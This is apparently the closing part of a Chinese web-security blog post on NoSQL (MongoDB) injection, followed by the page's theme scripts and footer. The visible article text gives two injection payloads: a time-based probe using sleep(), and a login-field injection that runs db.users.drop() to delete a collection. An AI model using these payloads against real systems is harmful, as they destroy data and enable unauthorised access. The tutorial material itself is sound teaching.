+效果如下：<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">db</span>.<span class="hljs-keyword">test</span>.find(&#123;uname:&#x27;anything&#x27;&#125;);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">db</span>.<span class="hljs-keyword">version</span>() &gt; <span class="hljs-string">&quot;0&quot;</span>) &#123; <span class="hljs-keyword">sleep</span>(1000) &#125;<span class="hljs-keyword">var</span> b=(&#123;a:&#x27;1&#x27;, <span class="hljs-keyword">pwd</span>:&#x27;anything&#x27;&#125;);<br></code></pre></div></td></tr></table></figure></li>
+<li>其他：<br>上辈子一定是仇人系列：<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;&#x27;&#125;); db.users.drop(); var a=(&#123;&#x27;a&#x27;: &quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;+&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure>
+插入等等语句均可。</li>
+</ul>
+<p><br><p style="text-align: center;" ><font size="2px" color="gray">来呀快活呀</font>
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="/img/loading.gif" lazyload style="zoom:30%" />
+</p></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">经验总结</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/03/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BXXE/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OWASP Top10 系列之 XXE</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">
+                        <span class="hidden-mobile">Oracle 注入指北</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    <!-- Tr0y -->
+    
+      <!-- APlayer 音乐播放器 -->
+      <div id="aplayer"></div>
+      <script defer src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js" ></script>
+<link  rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+
+<script type="text/javascript">
+  function snow(icon) {
+    //1、定义一片雪花模板
+    var flake = $("<div>").css({
+        "position": "absolute",
+        "color": "#fff"
+    }).html(icon);
+
+    //获取页面的宽度，利用这个数来算出，雪花开始时left的值
+    var documentWidth = $(document).width();
+
+    //获取页面的高度 相当于雪花下落结束时Y轴的位置
+    var documentHieght = $(document).height();
+
+    //定义生成一片雪花的毫秒数
+    var millisec = 1000;
+    //2、设置第一个定时器，周期性定时器，每隔一段时间（millisec）生成一片雪花；
+    setInterval(function() {
+        //随机生成雪花下落 开始 时left的值，相当于开始时X轴的位置
+        var startLeft = Math.random() * documentWidth;
+
+        //随机生成雪花下落 结束 时left的值，相当于结束时X轴的位置
+        var endLeft = Math.random() * documentWidth;
+
+        //随机生成雪花大小
+        var flakeSize = 20 + 10 * Math.random();
+
+        //随机生成雪花下落持续时间
+        var durationTime = 4000 + 7000 * Math.random();
+
+        //随机生成雪花下落 开始 时的透明度
+        var startOpacity = 0.7 + 0.3 * Math.random();
+
+        //随机生成雪花下落 结束 时的透明度
+        var endOpacity = 0.2 + 0.2 * Math.random();
+
+        //3、克隆一个雪花模板,定义雪花的初始样式，拼接到页面中
+        flake.clone().appendTo($("body")).css({
+            "left": startLeft,
+            "opacity": startOpacity,
+            "font-size": flakeSize,
+            "top": "-25px",
+        }).animate({ //执行动画
+            "left": endLeft,
+            "opacity": endOpacity,
+            "top": documentHieght
+        }, durationTime, function() {
+            //4、当雪花落下后，删除雪花。
+            $(this).remove(); 
+        });
+    }, millisec);
+  };
+
+  function festival_is_coming(d) {
+      var dateEnd = new Date();
+      var year=dateEnd.getFullYear();
+
+      var dateBegin = new Date(year+"-"+d+" 00:00:00");
+      var dateDiff = dateEnd.getTime() - dateBegin.getTime();
+      var dayDiff = Math.abs(Math.floor(dateDiff / (24 * 3600 * 1000)));
+      return dayDiff <= 3
+  }
+
+  var oldLoad = window.onload;
+
+  var autoplay = 'true' === 'true'
+  var loop = 'true' === 'true'
+  var songs = [{"name":"さみしい夜道","artist":"三澤康広","url":"/bgm/main.mp3","cover":"/img/bgm-main.png"}]
+
+    
+    var autoplay = false;
+    var loop = false;
+  
+
+  
+
+  
+
+  
+  window.onload = function () {
+    new APlayer({
+      container: document.getElementById('aplayer'),
+      fixed: true,
+      autoplay: autoplay,
+      loop: loop,
+      order: 'random',
+      theme: '#b7daff',
+      preload: 'none',
+      audio: songs
+    });
+    oldLoad && oldLoad();
+  }
+</script>
+
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+
+    var slogan = document.getElementById('subtitle').title;
+    if (slogan == "与地球重修旧好") {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          "与地球重修旧好 (1/3)",
+          "与地球重修旧好 (2/3)",
+          "与地球重修旧好 (3/3)",
+          "地球已离线，重试中..."
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: true,
+      });
+    }
+    else {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          slogan+"&nbsp;"
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: false,
+      });
+    }
+
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+
+</script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
